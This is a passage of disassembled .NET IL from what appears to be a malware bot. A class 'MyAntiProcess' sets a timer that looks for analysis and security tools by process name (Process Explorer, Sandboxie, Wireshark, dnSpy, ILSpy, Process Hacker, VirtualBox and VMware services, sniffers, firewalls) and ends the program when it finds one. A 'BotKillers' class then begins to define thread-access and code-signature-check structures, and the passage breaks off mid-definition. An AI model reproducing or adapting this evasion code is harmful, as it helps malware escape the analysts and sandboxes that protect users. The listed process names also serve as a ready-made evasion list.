    IL_0005:  stsfld     class j.OK MyAntiProcess::N
    IL_000a:  ret
  } // end of method MyAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MyAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       741 (0x2e5)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process[] V_8,
             int32 V_9,
             class [System]System.Diagnostics.Process[] V_10,
             int32 V_11,
             class [System]System.Diagnostics.Process[] V_12,
             int32 V_13,
             class [System]System.Diagnostics.Process[] V_14,
             int32 V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [System]System.Diagnostics.Process[] V_18,
             int32 V_19,
             class [System]System.Diagnostics.Process[] V_20,
             int32 V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [System]System.Diagnostics.Process[] V_24,
             int32 V_25,
             class [System]System.Diagnostics.Process[] V_26,
             int32 V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35)
    IL_0000:  ldstr      "procexp"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_001c

    IL_000f:  ldloc.0
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  pop
    IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0018:  ldloc.1
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000f

    IL_0022:  ldstr      "SbieCtrl"
    IL_0027:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_002c:  stloc.2
    IL_002d:  ldc.i4.0
    IL_002e:  stloc.3
    IL_002f:  br.s       IL_003e

    IL_0031:  ldloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldelem.ref
    IL_0034:  pop
    IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.1
    IL_003c:  add.ovf
    IL_003d:  stloc.3
    IL_003e:  ldloc.3
    IL_003f:  ldloc.2
    IL_0040:  ldlen
    IL_0041:  conv.i4
    IL_0042:  blt.s      IL_0031

    IL_0044:  ldstr      "SpyTheSpy"
    IL_0049:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_004e:  stloc.s    V_4
    IL_0050:  ldc.i4.0
    IL_0051:  stloc.s    V_5
    IL_0053:  br.s       IL_0066

    IL_0055:  ldloc.s    V_4
    IL_0057:  ldloc.s    V_5
    IL_0059:  ldelem.ref
    IL_005a:  pop
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0060:  ldloc.s    V_5
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.s    V_5
    IL_0066:  ldloc.s    V_5
    IL_0068:  ldloc.s    V_4
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0055

    IL_006e:  ldstr      "wireshark"
    IL_0073:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0078:  stloc.s    V_6
    IL_007a:  ldc.i4.0
    IL_007b:  stloc.s    V_7
    IL_007d:  br.s       IL_0090

    IL_007f:  ldloc.s    V_6
    IL_0081:  ldloc.s    V_7
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.s    V_7
    IL_008c:  ldc.i4.1
    IL_008d:  add.ovf
    IL_008e:  stloc.s    V_7
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldlen
    IL_0095:  conv.i4
    IL_0096:  blt.s      IL_007f

    IL_0098:  ldstr      "apateDNS"
    IL_009d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a2:  stloc.s    V_8
    IL_00a4:  ldc.i4.0
    IL_00a5:  stloc.s    V_9
    IL_00a7:  br.s       IL_00ba

    IL_00a9:  ldloc.s    V_8
    IL_00ab:  ldloc.s    V_9
    IL_00ad:  ldelem.ref
    IL_00ae:  pop
    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b4:  ldloc.s    V_9
    IL_00b6:  ldc.i4.1
    IL_00b7:  add.ovf
    IL_00b8:  stloc.s    V_9
    IL_00ba:  ldloc.s    V_9
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  blt.s      IL_00a9

    IL_00c2:  ldstr      "IPBlocker"
    IL_00c7:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cc:  stloc.s    V_10
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.s    V_11
    IL_00d1:  br.s       IL_00e4

    IL_00d3:  ldloc.s    V_10
    IL_00d5:  ldloc.s    V_11
    IL_00d7:  ldelem.ref
    IL_00d8:  pop
    IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00de:  ldloc.s    V_11
    IL_00e0:  ldc.i4.1
    IL_00e1:  add.ovf
    IL_00e2:  stloc.s    V_11
    IL_00e4:  ldloc.s    V_11
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldlen
    IL_00e9:  conv.i4
    IL_00ea:  blt.s      IL_00d3

    IL_00ec:  ldstr      "TiGeR-Firewall"
    IL_00f1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f6:  stloc.s    V_12
    IL_00f8:  ldc.i4.0
    IL_00f9:  stloc.s    V_13
    IL_00fb:  br.s       IL_010e

    IL_00fd:  ldloc.s    V_12
    IL_00ff:  ldloc.s    V_13
    IL_0101:  ldelem.ref
    IL_0102:  pop
    IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0108:  ldloc.s    V_13
    IL_010a:  ldc.i4.1
    IL_010b:  add.ovf
    IL_010c:  stloc.s    V_13
    IL_010e:  ldloc.s    V_13
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldlen
    IL_0113:  conv.i4
    IL_0114:  blt.s      IL_00fd

    IL_0116:  ldstr      "smsniff"
    IL_011b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0120:  stloc.s    V_14
    IL_0122:  ldc.i4.0
    IL_0123:  stloc.s    V_15
    IL_0125:  br.s       IL_0138

    IL_0127:  ldloc.s    V_14
    IL_0129:  ldloc.s    V_15
    IL_012b:  ldelem.ref
    IL_012c:  pop
    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  ldloc.s    V_15
    IL_0134:  ldc.i4.1
    IL_0135:  add.ovf
    IL_0136:  stloc.s    V_15
    IL_0138:  ldloc.s    V_15
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldlen
    IL_013d:  conv.i4
    IL_013e:  blt.s      IL_0127

    IL_0140:  ldstr      "exeinfoPE"
    IL_0145:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014a:  stloc.s    V_16
    IL_014c:  ldc.i4.0
    IL_014d:  stloc.s    V_17
    IL_014f:  br.s       IL_0162

    IL_0151:  ldloc.s    V_16
    IL_0153:  ldloc.s    V_17
    IL_0155:  ldelem.ref
    IL_0156:  pop
    IL_0157:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015c:  ldloc.s    V_17
    IL_015e:  ldc.i4.1
    IL_015f:  add.ovf
    IL_0160:  stloc.s    V_17
    IL_0162:  ldloc.s    V_17
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldlen
    IL_0167:  conv.i4
    IL_0168:  blt.s      IL_0151

    IL_016a:  ldstr      "NetSnifferCs"
    IL_016f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0174:  stloc.s    V_18
    IL_0176:  ldc.i4.0
    IL_0177:  stloc.s    V_19
    IL_0179:  br.s       IL_018c

    IL_017b:  ldloc.s    V_18
    IL_017d:  ldloc.s    V_19
    IL_017f:  ldelem.ref
    IL_0180:  pop
    IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0186:  ldloc.s    V_19
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_19
    IL_018c:  ldloc.s    V_19
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldlen
    IL_0191:  conv.i4
    IL_0192:  blt.s      IL_017b

    IL_0194:  ldstr      "Sandboxie Control"
    IL_0199:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019e:  stloc.s    V_20
    IL_01a0:  ldc.i4.0
    IL_01a1:  stloc.s    V_21
    IL_01a3:  br.s       IL_01b6

    IL_01a5:  ldloc.s    V_20
    IL_01a7:  ldloc.s    V_21
    IL_01a9:  ldelem.ref
    IL_01aa:  pop
    IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b0:  ldloc.s    V_21
    IL_01b2:  ldc.i4.1
    IL_01b3:  add.ovf
    IL_01b4:  stloc.s    V_21
    IL_01b6:  ldloc.s    V_21
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldlen
    IL_01bb:  conv.i4
    IL_01bc:  blt.s      IL_01a5

    IL_01be:  ldstr      "processhacker"
    IL_01c3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c8:  stloc.s    V_22
    IL_01ca:  ldc.i4.0
    IL_01cb:  stloc.s    V_23
    IL_01cd:  br.s       IL_01e0

    IL_01cf:  ldloc.s    V_22
    IL_01d1:  ldloc.s    V_23
    IL_01d3:  ldelem.ref
    IL_01d4:  pop
    IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01da:  ldloc.s    V_23
    IL_01dc:  ldc.i4.1
    IL_01dd:  add.ovf
    IL_01de:  stloc.s    V_23
    IL_01e0:  ldloc.s    V_23
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldlen
    IL_01e5:  conv.i4
    IL_01e6:  blt.s      IL_01cf

    IL_01e8:  ldstr      "dnSpy"
    IL_01ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f2:  stloc.s    V_24
    IL_01f4:  ldc.i4.0
    IL_01f5:  stloc.s    V_25
    IL_01f7:  br.s       IL_020a

    IL_01f9:  ldloc.s    V_24
    IL_01fb:  ldloc.s    V_25
    IL_01fd:  ldelem.ref
    IL_01fe:  pop
    IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0204:  ldloc.s    V_25
    IL_0206:  ldc.i4.1
    IL_0207:  add.ovf
    IL_0208:  stloc.s    V_25
    IL_020a:  ldloc.s    V_25
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldlen
    IL_020f:  conv.i4
    IL_0210:  blt.s      IL_01f9

    IL_0212:  ldstr      "CodeReflect"
    IL_0217:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021c:  stloc.s    V_26
    IL_021e:  ldc.i4.0
    IL_021f:  stloc.s    V_27
    IL_0221:  br.s       IL_0234

    IL_0223:  ldloc.s    V_26
    IL_0225:  ldloc.s    V_27
    IL_0227:  ldelem.ref
    IL_0228:  pop
    IL_0229:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_022e:  ldloc.s    V_27
    IL_0230:  ldc.i4.1
    IL_0231:  add.ovf
    IL_0232:  stloc.s    V_27
    IL_0234:  ldloc.s    V_27
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldlen
    IL_0239:  conv.i4
    IL_023a:  blt.s      IL_0223

    IL_023c:  ldstr      "Reflector"
    IL_0241:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0246:  stloc.s    V_28
    IL_0248:  ldc.i4.0
    IL_0249:  stloc.s    V_29
    IL_024b:  br.s       IL_025e

    IL_024d:  ldloc.s    V_28
    IL_024f:  ldloc.s    V_29
    IL_0251:  ldelem.ref
    IL_0252:  pop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  ldloc.s    V_29
    IL_025a:  ldc.i4.1
    IL_025b:  add.ovf
    IL_025c:  stloc.s    V_29
    IL_025e:  ldloc.s    V_29
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldlen
    IL_0263:  conv.i4
    IL_0264:  blt.s      IL_024d

    IL_0266:  ldstr      "ILSpy"
    IL_026b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0270:  stloc.s    V_30
    IL_0272:  ldc.i4.0
    IL_0273:  stloc.s    V_31
    IL_0275:  br.s       IL_0288

    IL_0277:  ldloc.s    V_30
    IL_0279:  ldloc.s    V_31
    IL_027b:  ldelem.ref
    IL_027c:  pop
    IL_027d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0282:  ldloc.s    V_31
    IL_0284:  ldc.i4.1
    IL_0285:  add.ovf
    IL_0286:  stloc.s    V_31
    IL_0288:  ldloc.s    V_31
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldlen
    IL_028d:  conv.i4
    IL_028e:  blt.s      IL_0277

    IL_0290:  ldstr      "VGAuthService"
    IL_0295:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029a:  stloc.s    V_32
    IL_029c:  ldc.i4.0
    IL_029d:  stloc.s    V_33
    IL_029f:  br.s       IL_02b2

    IL_02a1:  ldloc.s    V_32
    IL_02a3:  ldloc.s    V_33
    IL_02a5:  ldelem.ref
    IL_02a6:  pop
    IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ac:  ldloc.s    V_33
    IL_02ae:  ldc.i4.1
    IL_02af:  add.ovf
    IL_02b0:  stloc.s    V_33
    IL_02b2:  ldloc.s    V_33
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldlen
    IL_02b7:  conv.i4
    IL_02b8:  blt.s      IL_02a1

    IL_02ba:  ldstr      "VBoxService"
    IL_02bf:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c4:  stloc.s    V_34
    IL_02c6:  ldc.i4.0
    IL_02c7:  stloc.s    V_35
    IL_02c9:  br.s       IL_02dc

    IL_02cb:  ldloc.s    V_34
    IL_02cd:  ldloc.s    V_35
    IL_02cf:  ldelem.ref
    IL_02d0:  pop
    IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d6:  ldloc.s    V_35
    IL_02d8:  ldc.i4.1
    IL_02d9:  add.ovf
    IL_02da:  stloc.s    V_35
    IL_02dc:  ldloc.s    V_35
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldlen
    IL_02e1:  conv.i4
    IL_02e2:  blt.s      IL_02cb

    IL_02e4:  ret
  } // end of method MyAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     5.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void MyAntiProcess::Handler(object,
                                                     class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method MyAntiProcess::Start

} // end of class MyAntiProcess

.class private auto ansi sealed beforefieldinit BotKillers
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public ThreadAccess
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/ThreadAccess DIRECT_IMPERSONATION = int32(0x00000200)
    .field public static literal valuetype BotKillers/ThreadAccess GET_CONTEXT = int32(0x00000008)
    .field public static literal valuetype BotKillers/ThreadAccess IMPERSONATE = int32(0x00000100)
    .field public static literal valuetype BotKillers/ThreadAccess QUERY_INFORMATION = int32(0x00000040)
    .field public static literal valuetype BotKillers/ThreadAccess SET_CONTEXT = int32(0x00000010)
    .field public static literal valuetype BotKillers/ThreadAccess SET_INFORMATION = int32(0x00000020)
    .field public static literal valuetype BotKillers/ThreadAccess SET_THREAD_TOKEN = int32(0x00000080)
    .field public static literal valuetype BotKillers/ThreadAccess SUSPEND_RESUME = int32(0x00000002)
    .field public static literal valuetype BotKillers/ThreadAccess TERMINATE = int32(0x00000001)
  } // end of class ThreadAccess

  .class auto ansi sealed nested public WinTrustDataUIChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice All = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice None = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoBad = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoGood = uint32(0x00000004)
  } // end of class WinTrustDataUIChoice

  .class auto ansi sealed nested public WinTrustDataRevocationChecks
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks None = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks WholeChain = uint32(0x00000001)
  } // end of class WinTrustDataRevocationChecks

  .class auto ansi sealed nested public WinTrustDataChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataChoice File = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Catalog = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Blob = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Signer = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Certificate = uint32(0x00000005)
  } // end of class WinTrustDataChoice

  .class auto ansi sealed nested public WinTrustDataStateAction
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Ignore = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Verify = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Close = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCache = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCacheFlush = uint32(0x00000004)
  } // end of class WinTrustDataStateAction

  .class auto ansi sealed nested public WinTrustDataProvFlags
         extends [mscorlib]System.Enum
  {
    .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseIe4TrustFlag = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoIe4ChainFlag = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoPolicyUsageFlag = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckNone = uint32(0x00000010)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckEndCert = uint32(0x00000020)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChain = uint32(0x00000040)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChainExcludeRoot = uint32(0x00000080)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags SaferFlag = uint32(0x00000100)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags HashOnlyFlag = uint32(0x00000200)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseDefaultOsverCheck = uint32(0x00000400)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags LifetimeSigningFlag = uint32(0x00000800)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags CacheOnlyUrlRetrieval = uint32(0x00001000)
  } // end of class WinTrustDataProvFlags

  .class auto ansi sealed nested public WinTrustDataUIContext
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Execute = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Install = uint32(0x00000001)
  } // end of class WinTrustDataUIContext

  .class sequential unicode nested public WinTrustFileInfo
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int pszFilePath
    .field private native int hFile
    .field private native int pgKnownSubject
    .method public specialname rtspecialname 
            instance void  .ctor(string _filePath) cil managed
    {
      // Code size       62 (0x3e)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustFileInfo
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustFileInfo::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustFileInfo::hFile
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustFileInfo::pgKnownSubject
      IL_0031:  ldarg.0
      IL_0032:  ldarg.1
      IL_0033:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::StringToCoTaskMemAuto(string)
      IL_0038:  stfld      native int BotKillers/WinTrustFileInfo::pszFilePath
      IL_003d:  ret
    } // end of method WinTrustFileInfo::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustFileInfo::pszFilePath
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustFileInfo::Finalize

  } // end of class WinTrustFileInfo

  .class sequential unicode nested public WinTrustData
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int PolicyCallbackData
    .field private native int SIPClientData
    .field private valuetype BotKillers/WinTrustDataUIChoice UIChoice
    .field private valuetype BotKillers/WinTrustDataRevocationChecks RevocationChecks
    .field private valuetype BotKillers/WinTrustDataChoice UnionChoice
    .field private native int FileInfoPtr
    .field private valuetype BotKillers/WinTrustDataStateAction StateAction
    .field private native int StateData
    .field private string URLReference
    .field private valuetype BotKillers/WinTrustDataProvFlags ProvFlags
    .field private valuetype BotKillers/WinTrustDataUIContext UIContext
    .method public specialname rtspecialname 
            instance void  .ctor(string _fileName) cil managed
    {
      // Code size       158 (0x9e)
      .maxstack  3
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustData
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustData::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustData::PolicyCallbackData
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustData::SIPClientData
      IL_0031:  ldarg.0
      IL_0032:  ldc.i4.2
      IL_0033:  stfld      valuetype BotKillers/WinTrustDataUIChoice BotKillers/WinTrustData::UIChoice
      IL_0038:  ldarg.0
      IL_0039:  ldc.i4.0
      IL_003a:  stfld      valuetype BotKillers/WinTrustDataRevocationChecks BotKillers/WinTrustData::RevocationChecks
      IL_003f:  ldarg.0
      IL_0040:  ldc.i4.1
      IL_0041:  stfld      valuetype BotKillers/WinTrustDataChoice BotKillers/WinTrustData::UnionChoice
      IL_0046:  ldarg.0
      IL_0047:  ldc.i4.0
      IL_0048:  stfld      valuetype BotKillers/WinTrustDataStateAction BotKillers/WinTrustData::StateAction
      IL_004d:  ldarg.0
      IL_004e:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0053:  stfld      native int BotKillers/WinTrustData::StateData
      IL_0058:  ldarg.0
      IL_0059:  ldnull
      IL_005a:  stfld      string BotKillers/WinTrustData::URLReference
      IL_005f:  ldarg.0
      IL_0060:  ldc.i4     0x100
      IL_0065:  stfld      valuetype BotKillers/WinTrustDataProvFlags BotKillers/WinTrustData::ProvFlags
      IL_006a:  ldarg.0
      IL_006b:  ldc.i4.0
      IL_006c:  stfld      valuetype BotKillers/WinTrustDataUIContext BotKillers/WinTrustData::UIContext
      IL_0071:  ldarg.1
      IL_0072:  newobj     instance void BotKillers/WinTrustFileInfo::.ctor(string)
      IL_0077:  ldarg.0
      IL_0078:  ldtoken    BotKillers/WinTrustFileInfo
      IL_007d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0082:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0087:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::AllocCoTaskMem(int32)
      IL_008c:  stfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0091:  ldarg.0
      IL_0092:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0097:  ldc.i4.0
      IL_0098:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::StructureToPtr(object,
                                                                                                 native int,
                                                                                                 bool)
      IL_009d:  ret
    } // end of method WinTrustData::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustData::Finalize

  } // end of class WinTrustData

  .class auto ansi sealed nested public WinVerifyTrustResult
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/WinVerifyTrustResult Success = int32(0x00000000)
